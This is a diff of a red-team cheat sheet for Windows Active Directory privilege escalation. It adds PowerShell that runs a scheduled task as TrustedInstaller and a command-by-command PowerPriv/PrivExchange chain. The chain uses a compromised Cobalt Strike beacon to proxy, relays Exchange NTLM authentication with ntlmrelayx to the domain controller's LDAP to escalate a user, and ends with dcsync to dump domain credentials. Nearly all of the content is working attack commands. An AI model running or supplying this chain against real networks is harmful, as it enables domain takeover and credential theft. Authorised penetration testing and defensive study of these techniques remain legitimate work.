@@ -53,16 +53,33 @@ Lateral Movement
   exit original beacon
   verify no powershell is running
   
-PrivExchange 
-  https://github.com/dirkjanm/privexchange
-  ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
-  ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
-  python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
-  # Windows Version
-   - http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
-   
 PrivEsc
   Schedule Tasks/Trusted Installer
     https://tyranidslair.blogspot.com/2019/09/the-art-of-becoming-trustedinstaller.html?m=1
+      $a = New-ScheduledTaskAction -Execute notepad.exe
+      Register-ScheduledTask -TaskName 'TestTask' -Action $a
+      $svc = New-Object -ComObject 'Schedule.Service'
+      $svc.Connect()
+      $user = 'NT SERVICE\TrustedInstaller'
+      $folder = $svc.GetFolder('\')
+      $task = $folder.GetTask('TestTask')
+      $task.RunEx($null, 0, 0, $user)
+      
+  PowerPriv
+    Link: http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
+    Download Poweshell PS1: https://github.com/G0ldenGunSec/PowerPriv
+    Compromised Beacon: Powershell-Import /path/powerPriv.ps1
+    Compromised Beacon: socks 36529
+    Compromised Beacon: rportfwd 80 127.0.0.1 80
+    Kali: Verify /etc/proxychains.conf port matches socks above
+    Kali: proxychains ntlmrelayx -t ldap://DC_IP --esculate-user username
+    Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
+    dcsync fqdn dom\user
    
+  PrivExchange 
+    https://github.com/dirkjanm/privexchange
+    ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
+    ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
+    python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
+ 
  Artfact,PS_Log,Term_Log,CS_log [gui+cmd],CherTree
